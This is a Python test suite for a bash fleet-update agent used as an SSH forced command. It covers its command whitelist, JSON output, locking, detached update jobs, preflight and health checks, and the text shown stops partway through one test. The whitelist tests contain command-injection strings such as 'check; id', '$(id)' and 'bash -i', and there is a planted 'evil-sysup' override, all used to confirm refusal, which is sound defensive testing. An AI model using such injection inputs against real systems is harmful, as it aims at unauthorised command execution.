#!/usr/bin/env python3
"""fleet-agent (Unix): whitelist, JSON schema v1, lock, preflight, health, detach.

The agent is exercised for real (bash) inside a sandbox: every external tool it
touches (dnf, rpm, systemctl, docker, df, logger, sudo, systemd-run, pgrep,
nmcli, needs-restarting) is replaced by a stub placed first on PATH, and every
path (state, lock, /etc, power supply, reboot flag...) is redirected through
FLEET_AGENT_* variables. Nothing here needs root, a real host or the network.

"SSH killed during update" is simulated by running the verb in its own session
and killing that whole process group right after it answered: the detached job
must keep going and `report` must then return its final state.
"""

import json
import os
import re
import shutil
import signal
import stat
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
AGENT = ROOT / "dot_local/share/fleet/agent/fleet-agent.sh"
SYSUP = ROOT / "dot_local/bin/executable_sysup"
SUDOERS_TMPL = ROOT / ".chezmoiscripts/03-configure/run_always_install-sudoers-sysup.sh.tmpl"
INSTALL_TMPL = ROOT / ".chezmoiscripts/03-configure/run_onchange_install-fleet-agent.sh.tmpl"

V1_KEYS = {
    "schema", "host", "verb", "status", "reason", "packages", "changes",
    "health_before", "health_after", "preflight", "config_conflicts", "job",
    "reboot_required", "reboot_since", "os", "kernel", "major_available",
    "started", "ended", "log_tail",
}
AGENT_STATUSES = {
    "started", "running", "updated", "up-to-date", "degraded", "failed",
    "busy", "skipped", "unsupported",
}
VERBS = ["check", "update", "reboot-status", "reboot", "report"]

STUBS = {
    # Every stub records its invocation in $STUB_DIR/calls.log.
    "logger": 'echo "$*" >> "$STUB_DIR/logger.log"\n',
    "sudo": 'echo "sudo $*" >> "$STUB_DIR/sudo.log"\n',
    "pgrep": 'echo "pgrep $*" >> "$STUB_DIR/calls.log"\nexit "${STUB_PGREP_RC:-1}"\n',
    "nmcli": 'echo "nmcli $*" >> "$STUB_DIR/calls.log"\necho "${STUB_METERED:-no}"\n',
    "docker": (
        'echo "docker $*" >> "$STUB_DIR/calls.log"\n'
        '[ -f "$STUB_DIR/docker.out" ] && cat "$STUB_DIR/docker.out"\nexit 0\n'
    ),
    "needs-restarting": 'echo "needs-restarting $*" >> "$STUB_DIR/calls.log"\nexit "${STUB_NEEDS_RESTARTING_RC:-0}"\n',
    "rpm": 'echo "rpm $*" >> "$STUB_DIR/calls.log"\n[ -f "$STUB_DIR/rpm.db" ] && cat "$STUB_DIR/rpm.db"\nexit 0\n',
    "dnf": (
        'echo "dnf $*" >> "$STUB_DIR/calls.log"\n'
        'if [ "$2" = check-update ]; then\n'
        '  [ -n "${STUB_DNF_RC:-}" ] && { echo "dnf: error" >&2; exit "$STUB_DNF_RC"; }\n'
        '  i=0; while [ "$i" -lt "${STUB_DNF_PENDING:-0}" ]; do echo "pkg$i.x86_64 1.$i-1 updates"; i=$((i+1)); done\n'
        '  [ "${STUB_DNF_PENDING:-0}" -gt 0 ] && exit 100\nfi\nexit 0\n'
    ),
    "systemctl": (
        'echo "systemctl $*" >> "$STUB_DIR/calls.log"\n'
        'case "$1" in\n'
        '  --failed) [ -f "$STUB_DIR/failed.out" ] && cat "$STUB_DIR/failed.out"; exit 0 ;;\n'
        '  is-active) svc="$3"; [ -f "$STUB_DIR/down.list" ] && grep -qx "$svc" "$STUB_DIR/down.list" && exit 3; exit 0 ;;\n'
        'esac\nexit 0\n'
    ),
    "df": (
        'echo "df $*" >> "$STUB_DIR/calls.log"\n'
        'p="$2"\n'
        'echo "Filesystem 1024-blocks Used Available Capacity Mounted on"\n'
        'if [ "$p" = /boot ] && [ -n "${STUB_DF_BOOT_USE:-}" ]; then\n'
        '  echo "/dev/sda1 1000 1 1 ${STUB_DF_BOOT_USE}% /boot"\n'
        'elif [ "$p" = /boot ]; then\n'
        '  echo "/dev/sda2 1000 1 1 ${STUB_DF_ROOT_USE:-40}% /"\n'
        'else\n'
        '  echo "/dev/sda2 1000 1 1 ${STUB_DF_ROOT_USE:-40}% /"\nfi\n'
    ),
    "systemd-run": (
        'echo "$*" >> "$STUB_DIR/systemd-run.log"\n'
        'while [ "$#" -gt 0 ]; do\n'
        '  case "$1" in\n'
        '    --setenv=*) export "${1#--setenv=}" ;;\n'
        '    --) shift; break ;;\n'
        '  esac\n'
        '  shift\n'
        'done\n'
        '# Detached like a transient unit: own session, survives the caller.\n'
        'setsid "$@" >/dev/null 2>&1 </dev/null &\n'
    ),
}

SYSUP_STUB = r"""#!/usr/bin/env bash
echo "sysup $*" >> "$STUB_DIR/calls.log"
echo "started" > "$STUB_DIR/sysup.started"
echo "Updating things..."
[ -n "${STUB_SYSUP_OUTPUT:-}" ] && printf '%b\n' "$STUB_SYSUP_OUTPUT"
sleep "${STUB_SYSUP_SLEEP:-0}"
if [ -n "${STUB_RPM_AFTER:-}" ]; then printf '%b\n' "$STUB_RPM_AFTER" > "$STUB_DIR/rpm.db"; fi
if [ -n "${STUB_CREATE_FILES:-}" ]; then
  for f in $STUB_CREATE_FILES; do mkdir -p "$(dirname "$f")"; : > "$f"; done
fi
[ -n "${STUB_DOWN_AFTER:-}" ] && printf '%s\n' $STUB_DOWN_AFTER > "$STUB_DIR/down.list"
[ -n "${STUB_FAILED_AFTER:-}" ] && printf '%b\n' "$STUB_FAILED_AFTER" > "$STUB_DIR/failed.out"
echo "done" > "$STUB_DIR/sysup.finished"
exit "${STUB_SYSUP_RC:-0}"
"""

LINUX = sys.platform.startswith("linux")


class Sandbox:
    """Temp world for one test: stubs, state dir, fake /etc, fake sysfs."""

    def __init__(self):
        self.root = Path(tempfile.mkdtemp(prefix="fleet-agent-test-"))
        self.stub_dir = self.root / "stubs"
        self.bin = self.root / "bin"
        self.state = self.root / "state"
        self.etc = self.root / "etc"
        self.power = self.root / "power"
        self.modules = self.root / "modules"
        self.home = self.root / "home"
        for d in (self.stub_dir, self.bin, self.etc, self.power, self.modules, self.home):
            d.mkdir(parents=True)
        (self.modules / "6.1.0-1").mkdir()
        for name, body in STUBS.items():
            self._script(self.bin / name, "#!/usr/bin/env bash\n" + body)
        self._script(self.root / "sysup-stub", SYSUP_STUB)
        (self.root / "os-release").write_text('NAME="Debian GNU/Linux"\nVERSION_ID="12"\n')
        (self.stub_dir / "rpm.db").write_text("openssl 3.0.13-1\nbash 5.2-1\n")
        self.env = {
            **os.environ,
            "PATH": f"{self.bin}:{os.environ['PATH']}",
            "HOME": str(self.home),
            "STUB_DIR": str(self.stub_dir),
            "FLEET_AGENT_STATE_DIR": str(self.state),
            "FLEET_AGENT_SYSUP": str(self.root / "sysup-stub"),
            "FLEET_AGENT_ETC_DIR": str(self.etc),
            "FLEET_AGENT_POWER_DIR": str(self.power),
            "FLEET_AGENT_MODULES_DIR": str(self.modules),
            "FLEET_AGENT_KERNEL": "6.1.0-1",
            "FLEET_AGENT_REBOOT_FLAG": str(self.root / "reboot-required"),
            "FLEET_AGENT_CRITICAL_FILE": str(self.root / "critical-services"),
            "FLEET_AGENT_OS_RELEASE": str(self.root / "os-release"),
            "FLEET_AGENT_HOST": "testhost",
            "FLEET_AGENT_PKGMGR": "dnf",
            "FLEET_AGENT_REBOOT_DELAY": "0",
            "SSH_CONNECTION": "100.64.0.9 50000 100.64.0.1 22",
            "FLEET_AGENT_TEST": "1",
        }
        self.env.pop("SSH_ORIGINAL_COMMAND", None)

    @staticmethod
    def _script(path, body):
        path.write_text(body)
        path.chmod(path.stat().st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)

    def cleanup(self):
        # Reap detached jobs before removing their files.
        for _ in range(100):
            if not (self.state / "update.lock").exists():
                break
            time.sleep(0.1)
        shutil.rmtree(self.root, ignore_errors=True)

    def run(self, command, extra_env=None, args=(), timeout=30):
        env = dict(self.env)
        env.update(extra_env or {})
        if command is None:
            env.pop("SSH_ORIGINAL_COMMAND", None)
        else:
            env["SSH_ORIGINAL_COMMAND"] = command
        return subprocess.run(
            ["bash", str(AGENT), *args], env=env, capture_output=True, text=True,
            timeout=timeout, stdin=subprocess.DEVNULL,
        )

    def json_of(self, proc):
        lines = proc.stdout.splitlines()
        assert len(lines) == 1, f"expected exactly one JSON line, got {proc.stdout!r} / {proc.stderr!r}"
        return json.loads(lines[0])

    def wait_final(self, extra_env=None, timeout=20):
        """Poll `report` until the job left started/running."""
        deadline = time.time() + timeout
        while time.time() < deadline:
            proc = self.run("report", extra_env)
            data = self.json_of(proc)
            if data["status"] not in ("started", "running"):
                return proc, data
            time.sleep(0.2)
        raise AssertionError("update job never finished")

    def read(self, name):
        p = self.stub_dir / name
        return p.read_text() if p.exists() else ""


@unittest.skipUnless(LINUX, "agent behaviour tests stub Linux tooling")
class AgentCase(unittest.TestCase):
    def setUp(self):
        self.sb = Sandbox()
        self.addCleanup(self.sb.cleanup)


class Whitelist(AgentCase):
    def assert_refused(self, command, args=()):
        proc = self.sb.run(command, args=args)
        self.assertEqual(proc.returncode, 1, (command, proc.stdout, proc.stderr))
        self.assertEqual(proc.stdout, "", "a refusal must not print a result")
        self.assertIn("REFUSED", self.sb.read("logger.log"), "refusal must be logged")
        # Nothing was executed: no package tool, no sysup, no state created.
        calls = self.sb.read("calls.log")
        self.assertNotIn("sysup", calls)
        self.assertNotIn("dnf", calls)
        self.assertFalse((self.sb.stub_dir / "sysup.started").exists())
        self.assertFalse((self.sb.state / "jobs").exists())
        self.assertFalse((self.sb.state / "update.lock").exists())

    def test_unknown_verb(self):
        self.assert_refused("shutdown")

    def test_ping_is_not_an_agent_verb(self):
        self.assert_refused("ping")

    def test_extra_argument(self):
        self.assert_refused("check --all")

    def test_extra_argument_after_update(self):
        self.assert_refused("update foo")

    def test_shell_metacharacters(self):
        for cmd in ("check; id", "check && id", "check\nid", "$(id)", "check ", " check", "CHECK", "bash -i"):
            with self.subTest(cmd=cmd):
                self.assert_refused(cmd)

    def test_interactive_shell_attempt_has_no_command(self):
        # sshd leaves SSH_ORIGINAL_COMMAND unset for an interactive login.
        self.assert_refused(None)
        self.assert_refused("")

    def test_argv_is_refused_even_with_valid_verb(self):
        self.assert_refused("check", args=("--force",))

    def test_internal_job_entry_not_reachable_from_ssh_command(self):
        # The job runner is selected by environment, never by the command text.
        self.assert_refused("run-job")

    def test_job_entry_refused_when_reached_through_ssh(self):
        # FLEET_AGENT_JOB_ID selects the internal runner; with an SSH context
        # (SSH_CONNECTION / SSH_ORIGINAL_COMMAND) it must be refused, even with
        # the test flag, and run nothing.
        job = "20260101T000000Z-1"
        (self.sb.state / "jobs" / job).mkdir(parents=True)
        for cmd in (None, "check"):
            with self.subTest(cmd=cmd):
                proc = self.sb.run(cmd, {"FLEET_AGENT_JOB_ID": job})
                self.assertEqual(proc.returncode, 1, (proc.stdout, proc.stderr))
                self.assertEqual(proc.stdout, "")
                self.assertFalse((self.sb.stub_dir / "sysup.started").exists())

    def test_overrides_ignored_in_production_forced_command_path(self):
        # No FLEET_AGENT_TEST: sshd context. FLEET_AGENT_SYSUP / STATE_DIR etc.
        # must be ignored so an inherited variable can never swap the binary.
        evil = self.sb.root / "evil-sysup"
        marker = self.sb.root / "evil.ran"
        Sandbox._script(evil, f"#!/usr/bin/env bash\ntouch {marker}\n")
        evil_state = self.sb.root / "evil-state"
        env = {"FLEET_AGENT_TEST": "", "FLEET_AGENT_SYSUP": str(evil),
               "FLEET_AGENT_STATE_DIR": str(evil_state),
               "FLEET_AGENT_LOCK_DIR": str(self.sb.root / "evil-lock")}
        proc = self.sb.run("update", env)
        self.assertIn(proc.returncode, (0, 2, 3), proc.stderr)
        real_state = self.sb.home / ".local/state/fleet-agent"
        for _ in range(100):
            if not (real_state / "update.lock").exists():
                break
            time.sleep(0.1)
        self.assertFalse(marker.exists(), "overridden SYSUP binary was executed")
        self.assertFalse(evil_state.exists(), "overridden state dir was honoured")
        self.assertFalse((self.sb.root / "evil-lock").exists())
        self.assertTrue(real_state.exists(), "default state dir is used instead")

    def test_overrides_still_honoured_with_test_flag(self):
        proc = self.sb.run("update", {"FLEET_AGENT_TEST": "1"})
        self.assertEqual(self.sb.json_of(proc)["status"], "started")
        self.sb.wait_final()
        self.assertTrue((self.sb.stub_dir / "sysup.started").exists())

    def test_every_verb_is_accepted(self):
        for verb in ("check", "reboot-status", "report"):
            proc = self.sb.run(verb)
            self.assertIn(proc.returncode, (0, 2), (verb, proc.stderr))
        self.assertIn("call verb=check", self.sb.read("logger.log"))

    def test_log_file_override_receives_calls_and_refusals(self):
        log = self.sb.root / "agent.log"
        self.sb.run("reboot-status", {"FLEET_AGENT_LOG_FILE": str(log)})
        self.sb.run("nope", {"FLEET_AGENT_LOG_FILE": str(log)})
        text = log.read_text()
        self.assertIn("call verb=reboot-status", text)
        self.assertIn("REFUSED", text)
        self.assertIn("client=100.64.0.9", text)

    def test_refusal_log_neutralises_control_characters(self):
        self.sb.run("evil\x1b[31m\x07text")
        self.assertNotIn("\x1b", self.sb.read("logger.log"))
        self.assertNotIn("\x07", self.sb.read("logger.log"))


class SchemaV1(AgentCase):
    def assert_v1(self, data, verb):
        self.assertEqual(set(data), V1_KEYS)
        self.assertEqual(data["schema"], 1)
        self.assertEqual(data["verb"], verb)
        self.assertIn(data["status"], AGENT_STATUSES)
        self.assertEqual(data["host"], "testhost")
        self.assertIsInstance(data["changes"], list)
        self.assertIsInstance(data["config_conflicts"], list)
        self.assertIsInstance(data["reboot_required"], bool)
        self.assertIn(data["preflight"].keys(), [{"ok", "blocked_by"}])
        for key in ("health_before", "health_after"):
            h = data[key]
            self.assertEqual(
                set(h), {"failed_units", "unhealthy_containers", "disk_free_pct", "critical_services_down"}
            )
        self.assertRegex(data["started"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")
        self.assertRegex(data["ended"], r"^\d{4}-\d\d-\d\dT\d\d:\d\d:\d\dZ$")
        self.assertLessEqual(len(data["log_tail"].splitlines()), 20)

    def test_check_up_to_date(self):
        proc = self.sb.run("check")
        data = self.sb.json_of(proc)
        self.assert_v1(data, "check")
        self.assertEqual(proc.returncode, 0)
        self.assertEqual(data["status"], "up-to-date")
        self.assertEqual(data["packages"], 0)
        self.assertEqual(data["os"], "Debian GNU/Linux 12")
        self.assertEqual(data["kernel"], "6.1.0-1")
        self.assertEqual(data["health_before"]["disk_free_pct"]["/"], 60)

    def test_check_reports_pending_without_updating(self):
        data = self.sb.json_of(self.sb.run("check", {"STUB_DNF_PENDING": "3"}))
        self.assert_v1(data, "check")
        self.assertEqual(data["packages"], 3)
        self.assertEqual(data["status"], "skipped")
        self.assertEqual(data["reason"], "updates_pending")
        self.assertFalse((self.sb.stub_dir / "sysup.started").exists(), "check must be read-only")

    def test_check_failure_is_not_up_to_date_dnf(self):
        proc = self.sb.run("check", {"STUB_DNF_RC": "1"})
        data = self.sb.json_of(proc)
        self.assert_v1(data, "check")
        self.assertEqual((data["status"], data["reason"], data["packages"]), ("failed", "check_failed", None))
        self.assertEqual(proc.returncode, 2)

    def test_check_failure_is_not_up_to_date_apt(self):
        self.sb._script(self.sb.bin / "apt-get", "#!/usr/bin/env bash\necho 'E: broken' >&2\nexit 100\n")
        data = self.sb.json_of(self.sb.run("check", {"FLEET_AGENT_PKGMGR": "apt"}))
        self.assertEqual((data["status"], data["reason"], data["packages"]), ("failed", "check_failed", None))

    def test_check_failure_is_not_up_to_date_pacman(self):
        self.sb._script(self.sb.bin / "checkupdates", "#!/usr/bin/env bash\necho 'cannot sync' >&2\nexit 1\n")
        data = self.sb.json_of(self.sb.run("check", {"FLEET_AGENT_PKGMGR": "pacman"}))
        self.assertEqual((data["status"], data["reason"], data["packages"]), ("failed", "check_failed", None))

    def test_check_healthy_apt_and_pacman_still_work(self):
        self.sb._script(self.sb.bin / "apt-get", "#!/usr/bin/env bash\necho 'Inst a [1] (2 x)'\necho 'Inst b [1] (2 x)'\nexit 0\n")
        data = self.sb.json_of(self.sb.run("check", {"FLEET_AGENT_PKGMGR": "apt"}))
        self.assertEqual((data["status"], data["packages"]), ("skipped", 2))
        self.sb._script(self.sb.bin / "checkupdates", "#!/usr/bin/env bash\nexit 2\n")  # 2 = no updates
        data = self.sb.json_of(self.sb.run("check", {"FLEET_AGENT_PKGMGR": "pacman"}))
        self.assertEqual((data["status"], data["packages"]), ("up-to-date", 0))

    def test_check_without_package_manager_is_unsupported(self):
        data = self.sb.json_of(self.sb.run("check", {"FLEET_AGENT_PKGMGR": "none"}))
        self.assert_v1(data, "check")
        self.assertEqual(data["status"], "unsupported")

    def test_reboot_status(self):
        data = self.sb.json_of(self.sb.run("reboot-status"))
        self.assert_v1(data, "reboot-status")
        self.assertFalse(data["reboot_required"])
        self.assertIsNone(data["reboot_since"])

    def test_report_without_job(self):
        proc = self.sb.run("report")
        data = self.sb.json_of(proc)
        self.assert_v1(data, "report")
        self.assertEqual((data["status"], data["reason"]), ("skipped", "no_job"))
        self.assertEqual(proc.returncode, 0)

    def test_update_started_then_report_final(self):
        proc = self.sb.run("update", {"STUB_SYSUP_SLEEP": "1"})
        started = self.sb.json_of(proc)
        self.assert_v1(started, "update")
        self.assertEqual(proc.returncode, 0)
        self.assertEqual(started["status"], "started")
        self.assertRegex(started["job"], r"^\d{8}T\d{6}Z-\d+$")
        self.assertTrue(started["preflight"]["ok"])
        # update returned at once: sysup is still running (detached).
        running = self.sb.json_of(self.sb.run("report"))
        self.assert_v1(running, "report")
        self.assertIn(running["status"], ("started", "running"))
        self.assertEqual(running["job"], started["job"])

        proc, final = self.sb.wait_final({"STUB_RPM_AFTER": "openssl 3.0.15-1\nbash 5.2-1\nnewpkg 1.0-1"})
        # (STUB_RPM_AFTER only matters to the sysup stub inherited at launch; see below)
        self.assertIn(final["status"], ("updated", "up-to-date"))

    def test_update_final_state_lists_changes(self):
        env = {"STUB_RPM_AFTER": "openssl 3.0.15-1\nbash 5.2-1\nnewpkg 1.0-1"}
        started = self.sb.json_of(self.sb.run("update", env))
        self.assertEqual(started["status"], "started")
        proc, final = self.sb.wait_final()
        self.assert_v1(final, "report")
        self.assertEqual(proc.returncode, 0)
        self.assertEqual(final["status"], "updated")
        self.assertEqual(final["job"], started["job"])
        self.assertEqual(final["packages"], 2)
        changes = {c["name"]: c for c in final["changes"]}
        self.assertEqual(changes["openssl"], {"name": "openssl", "from": "3.0.13-1", "to": "3.0.15-1"})
        self.assertEqual(changes["newpkg"], {"name": "newpkg", "from": None, "to": "1.0-1"})
        self.assertIn("Updating things...", final["log_tail"])
        self.assertEqual(self.sb.read("calls.log").count("sysup"), 1)
        self.assertNotIn("--reboot", self.sb.read("calls.log"))
        self.assertFalse((self.sb.state / "update.lock").exists(), "lock released at the end")

    def test_update_up_to_date_when_nothing_changed(self):
        self.sb.run("update")
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "up-to-date")
        self.assertEqual(final["packages"], 0)

    def test_update_detached_through_systemd_run_user_unit(self):
        started = self.sb.json_of(self.sb.run("update"))
        self.sb.wait_final()
        log = self.sb.read("systemd-run.log")
        self.assertIn("--user", log)
        self.assertIn(f"--unit=fleet-update-{started['job']}", log)

    def test_sysup_failure_is_failed_with_exit_2(self):
        self.sb.run("update", {"STUB_SYSUP_RC": "4"})
        proc, final = self.sb.wait_final()
        self.assertEqual(final["status"], "failed")
        self.assertEqual(final["reason"], "sysup_exit_4")
        self.assertEqual(proc.returncode, 2)

    def test_missing_sysup_is_failed(self):
        self.sb.run("update", {"FLEET_AGENT_SYSUP": str(self.sb.root / "nope")})
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "failed")
        self.assertEqual(final["reason"], "sysup_exit_127")


class LockAndDetach(AgentCase):
    def test_concurrent_update_is_busy_exit_3(self):
        first = self.sb.json_of(self.sb.run("update", {"STUB_SYSUP_SLEEP": "3"}))
        self.assertEqual(first["status"], "started")
        proc = self.sb.run("update")
        data = self.sb.json_of(proc)
        self.assertEqual(proc.returncode, 3)
        self.assertEqual(data["status"], "busy")
        self.assertEqual(self.sb.read("calls.log").count("sysup"), 1, "second call must not run sysup")
        self.sb.wait_final()

    def test_reboot_is_busy_during_update_and_check_reports_running(self):
        self.sb.run("update", {"STUB_SYSUP_SLEEP": "3"})
        rb = self.sb.run("reboot")
        self.assertEqual(rb.returncode, 3)
        self.assertEqual(self.sb.json_of(rb)["status"], "busy")
        chk = self.sb.json_of(self.sb.run("check"))
        self.assertEqual(chk["status"], "running")
        self.assertEqual(self.sb.read("sudo.log"), "")
        self.sb.wait_final()

    def test_lock_is_atomic_across_simultaneous_calls(self):
        env = dict(self.sb.env, SSH_ORIGINAL_COMMAND="update", STUB_SYSUP_SLEEP="2")
        procs = [
            subprocess.Popen(["bash", str(AGENT)], env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for _ in range(4)
        ]
        results = [p.communicate(timeout=30) + (p.returncode,) for p in procs]
        codes = sorted(r[2] for r in results)
        self.assertEqual(codes, [0, 3, 3, 3], results)
        self.sb.wait_final()
        self.assertEqual(self.sb.read("calls.log").count("sysup"), 1)

    def test_stale_lock_of_dead_process_is_taken_over(self):
        lock = self.sb.state / "update.lock"
        lock.mkdir(parents=True)
        (lock / "pid").write_text("999999\n")
        proc = self.sb.run("update")
        self.assertEqual(self.sb.json_of(proc)["status"], "started")
        self.sb.wait_final()

    def test_concurrent_stale_lock_takeover_has_a_single_winner(self):
        lock = self.sb.state / "update.lock"
        lock.mkdir(parents=True)
        (lock / "pid").write_text("999999\n")
        old = time.time() - 3600
        os.utime(lock, (old, old))
        env = dict(self.sb.env, SSH_ORIGINAL_COMMAND="update", STUB_SYSUP_SLEEP="2")
        procs = [
            subprocess.Popen(["bash", str(AGENT)], env=env, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for _ in range(6)
        ]
        results = [p.communicate(timeout=30) + (p.returncode,) for p in procs]
        codes = sorted(r[2] for r in results)
        self.assertEqual(codes, [0, 3, 3, 3, 3, 3], results)
        self.sb.wait_final()
        self.assertEqual(self.sb.read("calls.log").count("sysup"), 1)
        self.assertEqual(list(self.sb.state.glob("update.lock.stale.*")), [], "stale dirs are cleaned up")

    def test_job_aborts_with_lock_lost_when_it_does_not_own_the_lock(self):
        job = "20260101T000000Z-1"
        jobdir = self.sb.state / "jobs" / job
        jobdir.mkdir(parents=True)
        (jobdir / "started").write_text("2026-01-01T00:00:00Z\n")
        # Lock taken over by someone else: it names another job.
        lock = self.sb.state / "update.lock"
        lock.mkdir()
        (lock / "pid").write_text(f"{os.getpid()}\n")
        (lock / "job").write_text("20260101T000000Z-999\n")
        env = dict(self.sb.env, FLEET_AGENT_JOB_ID=job)
        env.pop("SSH_CONNECTION", None)
        env.pop("SSH_ORIGINAL_COMMAND", None)
        proc = subprocess.run(["bash", str(AGENT)], env=env, capture_output=True, text=True,
                              timeout=30, stdin=subprocess.DEVNULL)
        self.assertEqual(proc.returncode, 2, (proc.stdout, proc.stderr))
        state = json.loads((jobdir / "state.json").read_text())
        self.assertEqual((state["status"], state["reason"]), ("failed", "lock_lost"))
        self.assertFalse((self.sb.stub_dir / "sysup.started").exists(), "sysup must not run")
        self.assertTrue(lock.exists(), "the other owner's lock is left alone")

    def test_ssh_killed_during_update_does_not_stop_the_job(self):
        env = dict(self.sb.env, SSH_ORIGINAL_COMMAND="update", STUB_SYSUP_SLEEP="2",
                   STUB_RPM_AFTER="openssl 3.0.15-1\nbash 5.2-1")
        # Own session = the "sshd session"; killing its group = the SSH cut.
        proc = subprocess.Popen(["bash", str(AGENT)], env=env, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, text=True, start_new_session=True)
        line = proc.stdout.readline()
        self.assertEqual(json.loads(line)["status"], "started")
        try:
            os.killpg(proc.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass  # already gone: the agent returns right after launching
        proc.wait(timeout=10)
        deadline = time.time() + 15
        while time.time() < deadline and not (self.sb.stub_dir / "sysup.finished").exists():
            time.sleep(0.1)
        self.assertTrue((self.sb.stub_dir / "sysup.finished").exists(), "update was interrupted")
        # A later session asks for the outcome.
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "updated")
        self.assertEqual(final["packages"], 1)

    def test_job_killed_hard_is_reported_failed_job_died(self):
        self.sb.run("update", {"STUB_SYSUP_SLEEP": "30"})
        pid = int((self.sb.state / "update.lock" / "pid").read_text())
        deadline = time.time() + 5
        while pid == 0 and time.time() < deadline:
            time.sleep(0.1)
        # Wait for the runner to take ownership of the lock (its pid != parent's).
        for _ in range(50):
            pid = int((self.sb.state / "update.lock" / "pid").read_text())
            if (self.sb.stub_dir / "sysup.started").exists():
                break
            time.sleep(0.1)
        os.kill(pid, signal.SIGKILL)
        subprocess.run(["pkill", "-f", "sysup-stub"], check=False)
        time.sleep(0.3)
        proc = self.sb.run("report")
        data = self.sb.json_of(proc)
        self.assertEqual((data["status"], data["reason"]), ("failed", "job_died"))
        self.assertEqual(proc.returncode, 2)


class Preflight(AgentCase):
    def assert_skipped(self, reason, env=None, setup=None):
        if setup:
            setup()
        proc = self.sb.run("update", env)
        data = self.sb.json_of(proc)
        self.assertEqual(proc.returncode, 0)
        self.assertEqual(data["status"], "skipped")
        self.assertEqual(data["reason"], reason)
        self.assertEqual(data["preflight"], {"ok": False, "blocked_by": reason})
        self.assertFalse((self.sb.stub_dir / "sysup.started").exists(), "no update attempted")
        self.assertFalse((self.sb.state / "update.lock").exists(), "lock released")

    def test_disk_low_root(self):
        self.assert_skipped("disk_low", {"STUB_DF_ROOT_USE": "95"})

    def test_disk_low_boot(self):
        self.assert_skipped("disk_low", {"STUB_DF_BOOT_USE": "85"})

    def test_boot_with_enough_space_is_fine(self):
        data = self.sb.json_of(self.sb.run("update", {"STUB_DF_BOOT_USE": "50"}))
        self.assertEqual(data["status"], "started")
        self.sb.wait_final()

    def test_on_battery(self):
        def setup():
            bat = self.sb.power / "BAT0"
            bat.mkdir()
            (bat / "type").write_text("Battery\n")
            (bat / "status").write_text("Discharging\n")
        self.assert_skipped("on_battery", setup=setup)

    def test_battery_charging_is_fine(self):
        bat = self.sb.power / "BAT0"
        bat.mkdir()
        (bat / "type").write_text("Battery\n")
        (bat / "status").write_text("Charging\n")
        data = self.sb.json_of(self.sb.run("update"))
        self.assertEqual(data["status"], "started")
        self.sb.wait_final()

    def test_metered_network(self):
        self.assert_skipped("metered_network", {"STUB_METERED": "yes"})

    def test_package_manager_running(self):
        self.assert_skipped("update_in_progress", {"STUB_PGREP_RC": "0"})

    def test_check_exposes_the_same_preflight(self):
        data = self.sb.json_of(self.sb.run("check", {"STUB_DF_ROOT_USE": "95", "STUB_DNF_PENDING": "1"}))
        self.assertEqual(data["preflight"], {"ok": False, "blocked_by": "disk_low"})


class HealthAndConflicts(AgentCase):
    def critical(self, *names):
        Path(self.sb.env["FLEET_AGENT_CRITICAL_FILE"]).write_text("# comment\n" + "\n".join(names) + "\n")

    def test_critical_service_down_after_update_is_degraded(self):
        self.critical("nginx", "kvmd")
        self.sb.run("update", {"STUB_DOWN_AFTER": "nginx"})
        proc, final = self.sb.wait_final()
        self.assertEqual(final["status"], "degraded")
        self.assertEqual(final["health_before"]["critical_services_down"], [])
        self.assertEqual(final["health_after"]["critical_services_down"], ["nginx"])
        self.assertIn("nginx", final["reason"])
        self.assertEqual(proc.returncode, 0)

    def test_new_failed_unit_is_degraded_but_existing_one_is_not(self):
        (self.sb.stub_dir / "failed.out").write_text("old.service loaded failed failed Old\n")
        self.sb.run("update", {"STUB_FAILED_AFTER": "old.service loaded failed failed Old\nnew.service loaded failed failed New"})
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "degraded")
        self.assertEqual(final["health_before"]["failed_units"], ["old.service"])
        self.assertEqual(final["health_after"]["failed_units"], ["new.service", "old.service"])
        self.assertIn("new.service", final["reason"])
        self.assertNotIn("old.service", final["reason"])

    def test_preexisting_failure_alone_is_not_degraded(self):
        (self.sb.stub_dir / "failed.out").write_text("old.service loaded failed failed Old\n")
        self.sb.run("update")
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "up-to-date")

    def test_unhealthy_container_after_update_is_degraded(self):
        self.sb.run("update", {"STUB_SYSUP_OUTPUT": ""})
        self.sb.wait_final()
        # Same flow with a container turning unhealthy: docker output changes.
        (self.sb.stub_dir / "docker.out").write_text("web|Up 2 minutes (unhealthy)\ndb|Up 2 minutes (healthy)\nold|Exited (0) 3 days ago\n")
        data = self.sb.json_of(self.sb.run("check"))
        self.assertEqual(data["health_before"]["unhealthy_containers"], ["old", "web"])

    def test_container_unhealthy_only_after(self):
        # Make the sysup stub flip docker's output.
        flip = self.sb.root / "sysup-flip"
        flip.write_text(
            "#!/usr/bin/env bash\n"
            'printf "web|Up 1 minute (unhealthy)\\n" > "$STUB_DIR/docker.out"\n'
        )
        flip.chmod(0o755)
        self.sb.run("update", {"FLEET_AGENT_SYSUP": str(flip)})
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "degraded")
        self.assertEqual(final["health_after"]["unhealthy_containers"], ["web"])

    def test_low_disk_after_update_is_degraded(self):
        flip = self.sb.root / "sysup-full"
        flip.write_text("#!/usr/bin/env bash\ntouch \"$STUB_DIR/full\"\n")
        flip.chmod(0o755)
        df = self.sb.bin / "df"
        df.write_text(
            "#!/usr/bin/env bash\n"
            'use=40; [ -f "$STUB_DIR/full" ] && use=95\n'
            'echo "Filesystem 1K Used Avail Cap Mounted"\n'
            'echo "/dev/sda2 1000 1 1 ${use}% /"\n'
        )
        self.sb.run("update", {"FLEET_AGENT_SYSUP": str(flip)})
        _, final = self.sb.wait_final()
        self.assertEqual(final["status"], "degraded")
        self.assertIn("disk", final["reason"])

    def test_config_conflicts_are_listed(self):
        files = [
            self.sb.etc / "ssh/sshd_config.rpmnew",
            self.sb.etc / "default/grub.dpkg-dist",
            self.sb.etc / "pacman.conf.pacnew",
        ]
